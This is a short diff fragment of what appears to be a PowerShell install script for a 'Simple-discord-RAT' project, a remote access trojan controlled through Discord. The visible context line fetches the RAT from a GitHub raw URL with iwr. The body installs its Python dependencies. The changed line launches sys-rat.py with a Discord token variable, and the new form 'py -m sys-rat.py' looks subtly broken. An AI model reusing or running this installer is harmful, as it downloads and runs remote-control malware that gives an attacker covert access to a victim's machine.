@@ -11,4 +11,4 @@ iwr -Uri https://raw.githubusercontent.com/simen64/Simple-discord-RAT/main/Simpl
 
 py -m pip install discord.py requests python-dotenv --user
 
-Python sys-rat.py $dc
+py -m sys-rat.py $dc
